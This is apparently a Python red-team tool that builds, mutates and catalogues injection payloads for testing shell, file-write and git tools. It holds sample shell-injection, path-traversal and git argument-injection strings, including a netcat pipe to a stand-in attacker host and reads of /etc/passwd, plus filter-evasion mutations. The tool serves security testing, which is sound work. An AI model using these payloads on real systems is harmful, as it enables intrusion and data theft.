#!/usr/bin/env python3
"""Red team payload pipeline: generation, curation, mutation, and lifecycle.

Three sources: LLM generation (RAG), community repos (curated), mutation.
Runs weekly. Payloads validated before catalog entry.
"""

import hashlib
from dataclasses import dataclass
from datetime import datetime
from typing import Callable


@dataclass
class Payload:
    """A single red team payload."""

    id: str
    content: str
    source: str  # 'generated' | 'community' | 'mutated'
    attack_class: str
    severity: str  # 'critical' | 'high' | 'medium' | 'low'
    tool_target: str  # 'shell_exec' | 'file_write' | 'git_command' | etc
    detections_triggered: int = 0
    last_triggered_at: datetime = None
    created_at: datetime = None
    retired: bool = False

    def compute_hash(self) -> str:
        """Deterministic hash of payload content."""
        return hashlib.sha256(self.content.encode()).hexdigest()[:16]


class PayloadGenerator:
    """
    Generates novel payloads using LLM + RAG over attack taxonomy.
    Runs weekly.
    """

    # Attack taxonomy for RAG retrieval
    ATTACK_CLASSES = {
        "shell_injection": [
            "command substitution",
            "pipe injection",
            "argument injection",
        ],
        "path_traversal": [
            "dot-dot traversal",
            "symlink escape",
            "Unicode normalization",
        ],
        "argument_injection": [
            "flag injection",
            "option confusion",
            "parameter pollution",
        ],
        "git_command_injection": [
            "remote URL injection",
            "ref name injection",
            "hook injection",
        ],
    }

    def __init__(self, model=None):
        self.model = model  # LLM for generation

    def generate_batch(self, n: int = 50, attack_classes: list = None) -> list[Payload]:
        """
        Generate n novel payloads.
        If attack_classes specified, focus on those; else random sample.
        """
        if attack_classes is None:
            attack_classes = list(self.ATTACK_CLASSES.keys())

        payloads = []
        for ac in attack_classes:
            relevant = self.ATTACK_CLASSES.get(ac, [])
            context = "\n".join(relevant)

            if self.model:
                raw = self.model.generate(
                    f"Generate shell injection payloads. Context: {context}"
                )
                payload_texts = self._parse_payload_response(raw)
            else:
                # Fallback: static examples
                payload_texts = self._static_examples(ac)

            for text in payload_texts:
                payloads.append(
                    Payload(
                        id=hashlib.sha256(text.encode()).hexdigest()[:8],
                        content=text,
                        source="generated",
                        attack_class=ac,
                        severity="medium",
                        tool_target=self._infer_tool_target(ac),
                        created_at=datetime.now(),
                    )
                )

        return payloads

    @staticmethod
    def _parse_payload_response(response: str) -> list[str]:
        """Parse LLM output into individual payloads."""
        return [line.strip() for line in response.split("\n") if line.strip()]

    @staticmethod
    def _static_examples(attack_class: str) -> list[str]:
        """Fallback static payload examples."""
        examples = {
            "shell_injection": [
                "$(whoami)",
                "`id`",
                "; cat /etc/passwd",
                "| nc attacker.com 4444",
            ],
            "path_traversal": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\win.ini",
                "....//....//etc/passwd",
            ],
            "git_command_injection": [
                "--upload-pack=sh${IFS}-c${IFS}id",
                "refs/heads/$(whoami)",
            ],
        }
        return examples.get(attack_class, [])

    @staticmethod
    def _infer_tool_target(attack_class: str) -> str:
        """Infer which tool a payload targets."""
        if "git" in attack_class:
            return "git_command"
        elif "path" in attack_class:
            return "file_write"
        else:
            return "shell_exec"


class PayloadMutator:
    """
    Systematic mutation of existing payloads.
    Encoding, case, whitespace, WAF evasion.
    """

    MUTATIONS: list[Callable[[str], str]] = [
        lambda p: p.replace(" ", "${IFS}"),  # IFS evasion
        lambda p: p.replace(" ", "\t"),  # tab
        lambda p: p.replace("cat", "c''at"),  # quote escaping
        lambda p: p.upper() if not p.isupper() else p.lower(),  # case swap
        lambda p: p + " #" + "x" * 10,  # comment padding
    ]

    @staticmethod
    def mutate_batch(payloads: list[Payload], n_per_payload: int = 3) -> list[Payload]:
        """
        Mutate existing payloads. Generate n variants per original.
        """
        import random

        mutated = []
        for p in payloads:
            for _ in range(n_per_payload):
                mutation_fn = random.choice(PayloadMutator.MUTATIONS)  # noqa: S311
                mutated_text = mutation_fn(p.content)
                mutated.append(
                    Payload(
                        id=hashlib.sha256(mutated_text.encode()).hexdigest()[:8],
                        content=mutated_text,
                        source="mutated",
                        attack_class=p.attack_class,
                        severity=p.severity,
                        tool_target=p.tool_target,
                        created_at=datetime.now(),
                    )
                )
        return mutated


class PayloadCatalog:
    """
    Manages payload lifecycle: generation, curation, validation, retirement.
    """

    def __init__(self, db_path: str):
        self.db_path = db_path
        self.generator = PayloadGenerator()
        self.mutator = PayloadMutator()

    def run_weekly_refresh(self) -> dict:
        """
        Run the full weekly payload refresh cycle.
        Returns summary of generated, validated, retired.
        """
        import sqlite3

        # Step 1: Generate new payloads
        generated = self.generator.generate_batch(n=50)

        # Step 2: Mutate existing high-value payloads
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.execute(
                """
                SELECT content, attack_class, severity, tool_target
                FROM payloads
                WHERE detections_triggered > 0
                  AND created_at > datetime('now', '-7 days')
                ORDER BY detections_triggered DESC
                LIMIT 20
                """
            )
            recent_high_value = [
                Payload(
                    id=hashlib.sha256(row[0].encode()).hexdigest()[:8],
                    content=row[0],
                    source="cached",
                    attack_class=row[1],
                    severity=row[2],
                    tool_target=row[3],
                )
                for row in cursor.fetchall()
            ]

        mutated = self.mutator.mutate_batch(recent_high_value, n_per_payload=3)

        # Step 3: Retire non-detecting payloads (older than 30 days with 0 detections)
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.execute(
                """
                SELECT id FROM payloads
                WHERE detections_triggered = 0
                  AND created_at < datetime('now', '-30 days')
                """
            )
            retired_ids = [row[0] for row in cursor.fetchall()]

            if retired_ids:
                placeholders = ",".join("?" * len(retired_ids))
                query = (
                    f"UPDATE payloads SET retired = TRUE WHERE id IN ({placeholders})"  # noqa: S608
                )
                conn.execute(query, retired_ids)
                conn.commit()

        # Step 4: Persist new payloads
        new_payloads = generated + mutated
        with sqlite3.connect(self.db_path) as conn:
            for p in new_payloads:
                conn.execute(
                    """
                    INSERT OR IGNORE INTO payloads
                    (id, content, source, attack_class, severity, tool_target, created_at)
                    VALUES (?, ?, ?, ?, ?, ?, ?)
                    """,
                    (
                        p.id,
                        p.content,
                        p.source,
                        p.attack_class,
                        p.severity,
                        p.tool_target,
                        p.created_at,
                    ),
                )
            conn.commit()

        return {
            "generated": len(generated),
            "mutated": len(mutated),
            "retired": len(retired_ids),
            "total_active": len(generated)
            + len(mutated)
            + (len(recent_high_value) - len(retired_ids)),
        }

    def record_detection(self, payload_id: str):
        """Record that a payload triggered a vulnerability."""
        import sqlite3

        with sqlite3.connect(self.db_path) as conn:
            conn.execute(
                """
                UPDATE payloads
                SET detections_triggered = detections_triggered + 1,
                    last_triggered_at = CURRENT_TIMESTAMP
                WHERE id = ?
                """,
                (payload_id,),
            )
            conn.commit()

    def get_active_payloads(self, tool_target: str = None) -> list[Payload]:
        """Fetch active (non-retired) payloads, optionally filtered by tool."""
        import sqlite3

        with sqlite3.connect(self.db_path) as conn:
            query = """
                SELECT id, content, source, attack_class, severity, tool_target,
                       detections_triggered, last_triggered_at
                FROM payloads
                WHERE retired = FALSE
                """
            params = []
            if tool_target:
                query += " AND tool_target = ?"
                params.append(tool_target)

            cursor = conn.execute(query, params)
            payloads = [
                Payload(
                    id=row[0],
                    content=row[1],
                    source=row[2],
                    attack_class=row[3],
                    severity=row[4],
                    tool_target=row[5],
                    detections_triggered=row[6],
                    last_triggered_at=row[7],
                )
                for row in cursor.fetchall()
            ]
        return payloads
